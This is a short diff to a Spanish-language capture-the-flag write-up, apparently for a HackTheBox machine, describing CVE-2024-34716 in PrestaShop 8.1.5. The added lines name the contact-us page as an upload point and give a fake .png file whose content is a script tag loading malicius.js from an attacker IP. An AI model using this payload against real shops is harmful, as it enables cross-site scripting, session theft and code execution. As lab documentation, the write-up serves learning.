@@ -26,5 +26,7 @@ Encontramos la versión y encontramos que tiene un CVE `CVE-2024-34716`
 `https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/`
 
 En el PoC nos explica que podemos crear un falso archivo `.png` en el cual podemos incluir contenido javascript que sera interpretado, por lo que se aconteceria un XXS
+Este archivo se puede incluir en la web `http://shop.trickster.htb/contact-us`
 
-Creamos el fichero `test.png` con el contenido 
+Creamos el fichero `test.png` con el contenido `<script src="http://10.10.14.18/malicius.js"></script>`
+
